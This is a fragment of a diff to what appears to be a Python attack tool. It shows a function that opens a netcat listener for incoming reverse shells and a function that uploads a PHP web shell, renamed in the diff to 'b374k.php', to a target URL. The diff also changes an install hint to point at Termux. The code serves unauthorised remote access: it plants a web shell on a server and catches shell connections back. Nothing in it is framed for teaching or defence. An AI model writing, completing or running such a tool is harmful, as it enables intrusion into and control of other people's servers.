@@ -30,12 +30,12 @@ def start_listener(ip, port):
     try:
         listener = subprocess.Popen(['nc', '-lvnp', f'{port}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     except FileNotFoundError:
-        print("Netcat (nc) not found. Please install it or use an alternative like socat or telnet.")
+        print("Netcat (nc) not found. Please install it using 'pkg install netcat' in Termux.")
         return None
     return listener
 
 def upload_shell(url, payload, upload_path):
-    files = {'file': ('shell.php', payload)}
+    files = {'file': ('b374k.php', payload)}
     response = requests.post(url, files=files)
     if response.status_code == 200:
         print(f"Shell uploaded successfully to {url.rstrip('/')}/{upload_path.lstrip('/')}")
